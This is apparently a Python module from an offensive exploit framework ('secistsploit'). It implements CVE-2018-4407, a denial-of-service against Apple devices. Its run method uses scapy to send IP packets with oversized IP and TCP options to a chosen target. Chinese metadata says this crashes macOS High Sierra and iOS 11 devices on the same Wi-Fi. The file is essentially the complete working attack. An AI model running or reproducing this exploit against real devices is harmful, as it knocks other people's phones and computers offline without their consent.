# -*- coding: UTF-8 -*-
import os,sys,shutil
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient
from telnetlib import IP
from scapy.all import *
from scapy.layers.inet import IPOption, TCP

class Exploit(TCPClient):
    __info__ = {
        "name": "CVE-2018-4407_Apple_ICMP_DOS",
        "\033[91m内容描述\033[0m": "CVE-2018-4407_Apple_ICMP_DOS模块叙述：\n"
                               "1.可以使同一Wifi下的macOS High Sierra与iOS11设备崩溃\n",
        "\033[91m参考链接\033[0m": (
            "https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407\n"
            "https://github.com/s2339956/check_icmp_dos-CVE-2018-4407-"
        ),
        "\033[91m作者\033[0m": (
            "WBGlIl",
        ),
        "\033[91m影响本版\033[0m":(
            "Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）\n",
            "Apple macOS High Sierra（受影响的最高版本为10.13.6）\n",
            "Apple macOS Sierra（受影响的最高版本为10.12.6）"
            "Apple OS X El Capitan及更早版本"
        ),
    }
    rhost = OptIP("", "远程目标IP地址")

    def run(self):
        RHOST = self.rhost
        try:
            print("[*] !!!!!!Dangerous operation!!!!!!")
            print("[*] Trying CVE-2018-4407 ICMP DOS " + RHOST)
            for i in range(8, 20):
                send(IP(dst=RHOST, options=[IPOption("A"*i)])/TCP(dport=2323, options=[(19, "1"*18), (19, "2"*18)]))
                print("[*] Check Over!! ")
        except Exception as e:
            print("[*] usage: sudo python check_icmp_dos.py 127.0.0.1")

